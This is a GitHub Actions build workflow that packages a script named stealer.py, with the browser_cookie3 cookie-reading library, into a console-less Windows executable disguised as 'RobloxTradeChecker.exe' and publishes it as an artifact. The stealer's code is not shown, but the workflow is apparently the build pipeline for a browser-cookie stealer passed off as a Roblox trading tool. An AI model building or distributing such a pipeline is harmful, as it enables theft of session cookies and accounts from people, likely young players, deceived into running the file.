name: Build EXE
on: [push]
jobs:
  build:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.10'
      - run: pip install browser_cookie3 requests pyinstaller
      - run: pyinstaller --onefile --noconsole --hidden-import=browser_cookie3 --name "RobloxTradeChecker" stealer.py
      - uses: actions/upload-artifact@v4
        with:
          name: RobloxTradeChecker
          path: dist/RobloxTradeChecker.exe
